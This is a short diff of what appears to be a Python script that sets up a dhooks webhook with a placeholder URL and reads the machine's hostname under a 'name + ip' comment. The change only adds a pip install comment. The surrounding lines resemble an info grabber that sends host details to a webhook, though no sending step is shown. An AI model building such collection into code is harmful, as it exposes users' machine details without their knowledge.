@@ -4,6 +4,7 @@ from requests import get
 
 hook = Webhook("WEBHOOK")
 
+# py -m pip install dhooks
 
 # name + ip
 pcname = socket.gethostname()
